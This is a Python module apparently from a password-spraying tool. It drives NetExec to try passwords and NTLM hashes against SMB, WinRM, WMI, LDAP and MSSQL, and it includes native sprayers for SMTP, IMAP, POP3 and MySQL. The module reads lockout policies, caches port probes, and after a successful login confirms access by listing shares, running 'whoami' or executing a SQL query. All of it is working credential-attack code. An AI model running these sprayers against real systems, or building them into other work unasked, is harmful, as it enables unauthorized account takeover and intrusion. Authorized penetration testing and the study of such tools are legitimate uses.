"""Everything that actually talks to a target.

Two families live here:
  * ``run_nxc`` / ``validate_access`` / ``read_lockout_policy`` shell out to nxc.
  * ``run_native`` + ``spray_*`` implement pure-Python sprayers for mail / mysql.

Each returns ``(output, err)``: `err` is set only for operational failures
(timeout, unreachable, tool missing); authentication results come back as
`output` text for :mod:`parsing` to classify.
"""

import imaplib
import os
import poplib
import re
import smtplib
import socket
import ssl
import subprocess
import threading
import time

from . import state
from .protocols import LOCAL_AUTH_PROTOCOLS


# ── nxc ─────────────────────────────────────────────────────────────────────
# Internal placeholder for the "user" when authenticating off an existing
# ccache (--use-kcache): there's no real username to spray, so one pseudo
# identity stands in for display/dedup, and is stripped before nxc sees it.
KCACHE_USER = "(kcache)"


def _kerberos_args(kerberos, domain, kdc_host, use_kcache=False):
    """-d/-k/--kdcHost/--use-kcache for Kerberos auth, shared across nxc calls."""
    if not kerberos:
        return []
    args = ["-k"]
    if domain:
        args += ["-d", domain]
    if kdc_host:
        args += ["--kdcHost", kdc_host]
    if use_kcache:
        args.append("--use-kcache")
    return args


def kcache_principal():
    """Best-effort: the default principal's username in $KRB5CCNAME, via `klist`,
    for display only (e.g. 'ryan.naylor' instead of the generic '(kcache)').
    Returns None if KRB5CCNAME is unset, klist is missing, or parsing fails."""
    if not os.environ.get("KRB5CCNAME"):
        return None
    try:
        r = subprocess.run(["klist"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=5)
    except Exception:
        return None
    m = re.search(r"Default principal:\s*(\S+)", r.stdout)
    if not m:
        return None
    return m.group(1).split("@", 1)[0]


def run_nxc(proto, target, user, secret, is_hash, local_auth, timeout, proxychains=False,
           kerberos=False, domain=None, kdc_host=None, use_kcache=False):
    cmd = ["proxychains", "-q"] if proxychains else []
    cmd += ["nxc", proto, target]
    if not use_kcache:
        cmd += ["-u", user]
        cmd += ["-H", secret] if is_hash else ["-p", secret]
    cmd += _kerberos_args(kerberos, domain, kdc_host, use_kcache)
    if local_auth and proto in LOCAL_AUTH_PROTOCOLS:
        cmd.append("--local-auth")

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, timeout=timeout)
        return result.stdout + result.stderr, None
    except subprocess.TimeoutExpired:
        return "", "timeout"
    except FileNotFoundError:
        return "", "nxc not in PATH"
    except Exception as e:
        return "", str(e)


def run_nxc_bulk(proto, target, userfile, secret, local_auth, timeout, proxychains=False,
                 kerberos=False, domain=None, kdc_host=None):
    """--bulk: one nxc invocation covers every username in ``userfile`` against
    a single plaintext ``secret``, instead of one subprocess per credential.
    Far fewer process spins, at the cost of this tool's own --jitter/--rate/
    --max-attempts/--validate/local-auth-retry — nxc runs the whole userlist
    itself with no per-credential hook back into this tool for those."""
    cmd = ["proxychains", "-q"] if proxychains else []
    cmd += ["nxc", proto, target, "-u", userfile, "-p", secret]
    cmd += _kerberos_args(kerberos, domain, kdc_host, False)
    if local_auth and proto in LOCAL_AUTH_PROTOCOLS:
        cmd.append("--local-auth")

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, timeout=timeout)
        return result.stdout + result.stderr, None
    except subprocess.TimeoutExpired as e:
        # one nxc process covers the WHOLE batch — by the time it's killed
        # for running long, it may well have already printed real result
        # lines for most of the userlist. subprocess.run() attaches whatever
        # it had captured so far to the exception itself; treat that as a
        # real (if incomplete) result instead of discarding it, or
        # spray_bulk() has no hit/fail lines to parse and ends up refunding
        # every user's --max-attempts charge as if none of them were ever
        # actually tried — losing real hits and letting an already-attempted
        # credential be retried on a later round.
        #
        # CPython quirk: even with text=True, TimeoutExpired.stdout/.stderr
        # are raw bytes (decoding only happens on normal completion), so
        # they must be decoded here before concatenating with str — a bare
        # (e.stdout or "") + (e.stderr or "") raises TypeError and would
        # silently destroy this exact recovery path.
        def _text(x):
            return x.decode(errors="replace") if isinstance(x, bytes) else (x or "")
        partial = _text(e.stdout) + _text(e.stderr)
        if partial.strip():
            return partial, None
        return "", "timeout"
    except FileNotFoundError:
        return "", "nxc not in PATH"
    except Exception as e:
        return "", str(e)


def validate_access(proto, target, user, secret, is_hash, timeout,
                    kerberos=False, domain=None, kdc_host=None, use_kcache=False,
                    local_auth=False):
    """Secondary nxc check to tell real access apart from a bare auth success.
    Returns (is_access, message, op_failed). NOTE: this costs one extra
    authentication. ``op_failed`` is True only for a timeout/exception — an
    operational problem, not a real answer — so the caller can refund the
    --max-attempts charge it reserved for this extra attempt instead of
    treating a tool/network hiccup as a real (if inconclusive) auth attempt.

    ``local_auth`` must match whatever got the *first* auth to succeed —
    otherwise this re-checks over domain auth, fails for an unrelated reason,
    and wrongly reports "no secondary confirmation" on a perfectly good hit."""
    user_args = [] if use_kcache else ["-u", user]
    creds = [] if use_kcache else (["-H", secret] if is_hash else ["-p", secret])
    creds += _kerberos_args(kerberos, domain, kdc_host, use_kcache)
    if local_auth and proto in LOCAL_AUTH_PROTOCOLS:
        creds.append("--local-auth")
    try:
        if proto == "smb":
            r = subprocess.run(["nxc", "smb", target, *user_args, *creds, "--shares"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "ADMIN$" in r.stdout or "WRITE" in r.stdout:
                return True, "ADMIN$/WRITE share confirmed", False
            return False, "Auth valid, limited share access", False

        if proto in ("winrm", "wmi"):
            r = subprocess.run(["nxc", proto, target, *user_args, *creds, "-x", "whoami"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if use_kcache:
                # under --use-kcache with an unresolved ccache principal,
                # `user` is just the "(kcache)" placeholder (KCACHE_USER) —
                # it can never appear in real `whoami` output, so fall back
                # to shape-matching a DOMAIN\user line instead of a literal
                # substring match that would always miss. But nxc's own
                # connection-success banner line (printed on every successful
                # auth, before any command runs) is ALSO shaped like
                # "DOMAIN\user" and would match just as readily — restricted
                # to lines that aren't one of nxc's own "[+]"/"[-]"/"[*]"
                # status lines, so only the raw `whoami` command output
                # itself (unprefixed) counts as confirmed execution.
                executed = "Pwn3d!" in r.stdout or any(
                    re.search(r"\S+\\\S+", line)
                    for line in r.stdout.splitlines()
                    if not line.strip().startswith(("[+]", "[-]", "[*]")))
            else:
                executed = user.lower() in r.stdout.lower() or "Pwn3d!" in r.stdout
            if executed:
                return True, f"{proto.upper()} command execution confirmed", False
            return False, f"{proto.upper()} auth valid, no execution", False

        if proto == "ldap":
            r = subprocess.run(["nxc", "ldap", target, *user_args, *creds, "--users"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "CN=" in r.stdout or "userPrincipalName" in r.stdout:
                return True, "LDAP bind + enumeration confirmed", False
            return False, "LDAP auth valid (use for BloodHound)", False

        if proto == "mssql":
            r = subprocess.run(["nxc", "mssql", target, *user_args, *creds, "-q", "SELECT @@version"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "Microsoft SQL Server" in r.stdout or "Pwn3d!" in r.stdout:
                return True, "MSSQL query execution confirmed", False
            return False, "MSSQL auth valid, no execution", False

    except subprocess.TimeoutExpired:
        return False, "Validation timed out", True
    except Exception as e:
        return False, f"Validation error: {e}", True

    return False, "No secondary confirmation", False


def read_lockout_policy(target, user, secret, is_hash, timeout,
                        kerberos=False, domain=None, kdc_host=None, use_kcache=False):
    """Run ``nxc smb --pass-pol`` and parse the lockout threshold / reset window.
    Returns {threshold:int|None, window:str} or None if it couldn't be read."""
    user_args = [] if use_kcache else ["-u", user]
    creds = [] if use_kcache else (["-H", secret] if is_hash else ["-p", secret])
    creds += _kerberos_args(kerberos, domain, kdc_host, use_kcache)
    try:
        r = subprocess.run(["nxc", "smb", target, *user_args, *creds, "--pass-pol"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
    except Exception:
        return None
    out = r.stdout + r.stderr
    mt = re.search(r"Account Lockout Threshold:\s*(\d+|None)", out)
    mw = re.search(r"Reset Account Lockout Counter:\s*(.+)", out)
    if not mt:
        return None
    thr = None if mt.group(1) == "None" else int(mt.group(1))
    return {"threshold": thr, "window": (mw.group(1).strip() if mw else "unknown")}


# ── Native sprayers ──────────────────────────────────────────────────────────
def port_open(host, port, timeout=5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


_PORT_CLOSED_TTL = 60     # seconds a cached "closed/filtered" result is trusted
_PORT_OPEN_TTL   = 600    # seconds a cached "open" result is trusted


def port_reachable(host, port, timeout=5):
    """Cached ``port_open``: a native-protocol spray against N users/passwords
    hits the same target:port N times, so without this every one of them pays
    its own TCP probe (full `timeout` seconds when the port is closed/filtered).

    Both directions expire, just on different clocks. A ``closed/filtered``
    result is only trusted for _PORT_CLOSED_TTL seconds: on a long run, one
    transient timeout (self-inflicted congestion from many simultaneous first
    probes, a brief network blip) would otherwise permanently blacklist a
    genuinely open port for everyone, for the rest of a potentially hours-
    long spray. An ``open`` result gets the longer _PORT_OPEN_TTL instead of
    living forever — a service can go down mid-run (crash, a firewall rule,
    or an IDS/IPS block the spray itself triggered), and without an expiry
    every later attempt against that host:port would keep skipping the
    pre-check and paying a full connection timeout instead of failing fast
    once the port is actually gone.

    Concurrent first-time lookups of the same (host, port) serialise onto a
    per-key lock instead of each independently missing the cache and paying
    their own full-timeout probe — the whole point of caching this."""
    key = (host, port)

    def _fresh(cached):
        result, ts = cached
        ttl = _PORT_OPEN_TTL if result else _PORT_CLOSED_TTL
        return time.time() - ts < ttl

    with state.port_lock:
        cached = state.port_cache.get(key)
        if cached is not None and _fresh(cached):
            return cached[0]
        lock = state.port_probe_locks.setdefault(key, threading.Lock())

    with lock:
        with state.port_lock:
            cached = state.port_cache.get(key)
            if cached is not None and _fresh(cached):
                return cached[0]
        result = port_open(host, port, timeout)
        with state.port_lock:
            state.port_cache[key] = (result, time.time())
            # drop the now-unneeded lock entry so a long run against many
            # hosts/ports doesn't accumulate one Lock object per key forever
            # — safe even if another thread is mid-setdefault on the same
            # key: it'll just get its own fresh Lock, and the cache hit above
            # means it won't actually need to acquire it.
            state.port_probe_locks.pop(key, None)
        return result


def spray_smtp(target, user, password, timeout, use_ssl=False):
    ports = [465] if use_ssl else [587, 25]
    reachable = [p for p in ports if port_reachable(target, p, timeout=min(timeout, 5))]
    if not reachable:
        return "", f"smtp: no port responded on {target} (tried {', '.join(map(str, ports))})"

    last_err = None
    for port in reachable:
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                server = smtplib.SMTP_SSL(target, port, timeout=timeout, context=ctx)
            else:
                server = smtplib.SMTP(target, port, timeout=timeout)
                try:
                    server.starttls(context=ssl._create_unverified_context())
                except Exception:
                    pass
            server.login(user, password)
            server.quit()
            return f"[+] SMTP {target}:{port} {user}:{password} — AUTH SUCCESS", None
        except smtplib.SMTPAuthenticationError as e:
            return f"[-] SMTP {target}:{port} {user} — AUTH FAILED ({e.smtp_code})", None
        except Exception as e:
            last_err = e
            continue
    return "", f"smtp: {target} reachable but no port accepted AUTH ({last_err})"


def spray_imap(target, user, password, timeout, use_ssl=False):
    port = 993 if use_ssl else 143
    if not port_reachable(target, port, timeout=min(timeout, 5)):
        return "", f"imap: {target}:{port} unreachable"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = imaplib.IMAP4_SSL(target, port, ssl_context=ctx, timeout=timeout)
        else:
            conn = imaplib.IMAP4(target, port, timeout=timeout)
        status, _ = conn.login(user, password)
        conn.logout()
        if status == "OK":
            return f"[+] IMAP {'SSL ' if use_ssl else ''}{target}:{port} {user}:{password} — AUTH SUCCESS", None
        return f"[-] IMAP {target}:{port} {user} — {status}", None
    except imaplib.IMAP4.error as e:
        if "locked" in str(e).lower():
            return f"STATUS_ACCOUNT_LOCKED_OUT IMAP {target} {user}", None
        return f"[-] IMAP {target}:{port} {user} — AUTH FAILED", None
    except (ConnectionRefusedError, socket.timeout, OSError):
        return "", f"imap: {target}:{port} unreachable"
    except Exception as e:
        return "", str(e)


def spray_pop3(target, user, password, timeout, use_ssl=False):
    port = 995 if use_ssl else 110
    if not port_reachable(target, port, timeout=min(timeout, 5)):
        return "", f"pop3: {target}:{port} unreachable"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = poplib.POP3_SSL(target, port, context=ctx, timeout=timeout)
        else:
            conn = poplib.POP3(target, port, timeout=timeout)
        conn.user(user)
        conn.pass_(password)
        conn.quit()
        return f"[+] POP3 {'SSL ' if use_ssl else ''}{target}:{port} {user}:{password} — AUTH SUCCESS", None
    except poplib.error_proto as e:
        if "lock" in str(e).lower():
            return f"STATUS_ACCOUNT_LOCKED_OUT POP3 {target} {user}", None
        return f"[-] POP3 {target}:{port} {user} — AUTH FAILED", None
    except (ConnectionRefusedError, socket.timeout, OSError):
        return "", f"pop3: {target}:{port} unreachable"
    except Exception as e:
        return "", str(e)


def spray_mysql(target, user, password, timeout):
    if not port_reachable(target, 3306, timeout=min(timeout, 5)):
        return "", f"mysql: {target}:3306 unreachable"
    try:
        import pymysql
        conn = pymysql.connect(host=target, port=3306, user=user,
                               password=password, connect_timeout=timeout)
        conn.close()
        return f"[+] MySQL {target}:3306 {user}:{password} — AUTH SUCCESS (Pwn3d!)", None
    except ImportError:
        return "", "pymysql not installed"
    except Exception as e:
        msg = str(e).lower()
        if "locked" in msg:
            return f"STATUS_ACCOUNT_LOCKED_OUT MySQL {target} {user}", None
        if "access denied" in msg:
            return f"[-] MySQL {target}:3306 {user} — ACCESS DENIED", None
        return "", f"mysql: {e}"


_NATIVE = {
    "smtp":  lambda t, u, s, to: spray_smtp(t, u, s, to, use_ssl=False),
    "smtps": lambda t, u, s, to: spray_smtp(t, u, s, to, use_ssl=True),
    "imap":  lambda t, u, s, to: spray_imap(t, u, s, to, use_ssl=False),
    "imaps": lambda t, u, s, to: spray_imap(t, u, s, to, use_ssl=True),
    "pop3":  lambda t, u, s, to: spray_pop3(t, u, s, to, use_ssl=False),
    "pop3s": lambda t, u, s, to: spray_pop3(t, u, s, to, use_ssl=True),
    "mysql": lambda t, u, s, to: spray_mysql(t, u, s, to),
}


def run_native(proto, target, user, secret, timeout):
    fn = _NATIVE.get(proto)
    if fn is None:
        return "", f"unknown native protocol: {proto}"
    return fn(target, user, secret, timeout)
